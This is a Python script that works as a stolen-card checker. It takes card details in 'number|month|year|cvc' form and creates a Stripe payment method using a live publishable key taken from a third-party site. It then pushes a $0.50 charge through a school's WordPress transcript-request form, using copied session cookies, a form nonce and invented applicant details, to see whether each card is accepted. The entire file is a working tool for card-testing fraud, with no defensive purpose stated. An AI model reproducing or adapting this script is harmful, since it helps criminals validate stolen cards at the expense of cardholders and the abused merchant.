import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F0b5b1045be%3B+stripe-js-v3%2F0b5b1045be%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F',
	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    '__stripe_mid': '45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e',
	    '__stripe_sid': '8f3de5db-b352-41a7-a2d7-eadf7b54c7df3be9df',
	}
	
	headers = {
	    'authority': 'narhs.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_mid=45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e; __stripe_sid=8f3de5db-b352-41a7-a2d7-eadf7b54c7df3be9df',
	    'origin': 'https://narhs.com',
	    'referer': 'https://narhs.com/transcript-request/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1743613301320',
	}
	
	data = 'data=item_5__fluent_sf%3D%26__fluent_form_embded_post_id%3D458%26_fluentform_5_fluentformnonce%3D76c8c00264%26_wp_http_referer%3D%252Ftranscript-request%252F%26input_text_2%3DRodam%26input_text_3%3DUser%26datetime%3D04%252F10%252F2001%26email%3Drodamuser22%2540gmail.com%26input_text%3DNY%26dropdown%3DCommon%2520App%26terms-n-condition%3Don%26input_radio%3DOfficial%2520(%252410%252Fea)%26numeric-field%3D1%26description%3D%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
	
	r2 = requests.post('https://narhs.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
